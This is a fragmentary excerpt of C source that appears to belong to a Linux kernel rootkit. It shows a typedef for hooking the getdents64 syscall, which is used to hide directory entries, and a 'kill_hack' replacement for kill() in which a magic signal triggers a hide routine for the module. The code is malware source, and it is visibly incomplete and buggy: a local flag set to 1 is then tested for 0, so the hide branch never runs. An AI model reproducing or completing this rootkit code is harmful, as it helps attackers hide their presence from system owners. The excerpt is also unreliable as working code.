...
typedef asmlinkage long (*orig_getdents64_t) (unsigned int fd,struct linux_dirent __user * dirent,unsigned int count);
...
#else 
static asmlinkage long kill_hack(pid_t pid,int sig){
    short hide = 1;
    if(sig == HIDE_UNHIDE_SIG && hide == 0){
        vlr_hide();
        hide = 1;
